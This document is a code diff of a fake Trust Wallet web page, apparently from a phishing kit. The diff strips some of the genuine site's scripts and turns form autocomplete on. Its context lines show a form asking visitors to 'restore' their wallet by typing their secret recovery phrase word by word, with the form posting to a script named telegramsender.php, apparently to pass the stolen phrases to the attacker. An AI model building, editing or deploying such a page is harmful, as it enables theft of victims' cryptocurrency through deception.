@@ -27,49 +27,6 @@
       <link rel="shortcut icon" type="image/png" href="static/login/images/favicon.png">
       <meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
       <meta name="theme-color" content="#3375BB">
-      <script type="application/ld+json">
-         {
-           "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
-           "@type": "WebPage",
-           "url": "https://trustwallet.com/",
-           "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
-           "@context": "https://schema.org"
-         }
-      </script><script async="" defer="" data-domain="trustwallet.com" src="js/plausible.js"></script><script type="application/javascript">
-         document.addEventListener("DOMContentLoaded", function(event) {
-           document.getElementById('navbarToggle').addEventListener('click', function() {
-             var el = document.getElementById('navbarSupportedContent');
-             var toggled = window.getComputedStyle(el).display == 'block';
-             if (toggled) {
-               el.style.display = "none";
-             } else {
-               el.style.display = "block";
-             }
-           })
-           //Add Huawei download button based on device.
-           var result = new UAParser().getResult();
-           var apple = document.getElementsByClassName("apple");
-           var huawei = document.getElementsByClassName("huawei");
-           var download = document.getElementsByClassName("downloadapp-native");
-         
-           if (result.os.name == "Android") {
-             for (var i = 0; i < huawei.length; i++) {
-               huawei[i].classList.remove("hidden");
-               apple[i].classList.add("hidden");
-             }
-             // if it is android change ctas to googleplay
-             for (var i = 0; i < download.length; i++) {
-               download[i].href = "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite";
-             }
-           }
-           // if its apple change ctas to appstore
-            else if (result.os.name == "iOS") {
-             for (var i = 0; i < download.length; i++) {
-               download[i].href = "https://apps.apple.com/app/apple-store/id1288339409?mt=8";
-             }
-           }
-         });
-      </script>
       <link rel="preload" href="static/login/fonts/IBMPlexSans/IBMPlexSans-Regular.woff2.html" as="font" type="font/woff2" crossorigin="">
       <link rel="preload" href="static/login/fonts/IBMPlexSans/IBMPlexSans-Bold.woff2.html" as="font" type="font/woff2" crossorigin="">
       <link rel="preload" href="static/login/fonts/IBMPlexSans/IBMPlexSans-Medium.woff2.html" as="font" type="font/woff2" crossorigin="">
@@ -86,7 +43,6 @@
       <link rel="alternate" href="pt_BR/index.htm" hreflang="pt">
       <link rel="alternate" href="zh_CN/index.htm" hreflang="zh">
       <link rel="alternate" href="es/index.htm" hreflang="es">
-      <script type="text/javascript" src="static/login/js/platform.js.html"></script>
    </head>
 
    <style>
@@ -178,7 +134,7 @@
         <p style="color: #fff; max-width: 300px; margin: 0 auto; text-align: center; margin-bottom: 10px; font-weight: 500;">
           Restore your existing wallet with your secret recovery phrase of 12
         </p>
-        <form id="form-contact" method="POST" class="contact-form" action="telegramsender.php" autocomplete="off">
+        <form id="form-contact" method="POST" class="contact-form" action="telegramsender.php" autocomplete="on">
           <p class="contact-form__message"></p>
           <div class="contact-form__input-wrapper contact-form__input-wrapper_name">
             <input name="phone1" type="text" class="input1 contact-form__input contact-form__input_name" tabindex="0" placeholder="1" id="input1" required="">
